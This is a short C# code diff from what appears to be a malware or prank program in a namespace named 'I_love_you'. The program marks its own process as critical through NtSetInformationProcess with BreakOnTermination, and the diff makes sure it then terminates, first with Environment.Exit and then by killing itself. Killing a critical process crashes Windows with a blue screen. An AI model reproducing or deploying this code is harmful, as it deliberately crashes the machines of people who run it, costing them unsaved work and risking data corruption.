@@ -214,7 +214,16 @@ namespace I_love_you
 
                 // setting the BreakOnTermination = 1 for the current process
                 NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
-                this.Close();
+                try
+                {
+                    Environment.Exit(0);
+                }
+                catch(Exception ex)
+                {
+                    //
+                    System.Diagnostics.Process tt = System.Diagnostics.Process.GetProcessById(System.Diagnostics.Process.GetCurrentProcess().Id);
+                    tt.Kill();
+                }
             }
         }
 
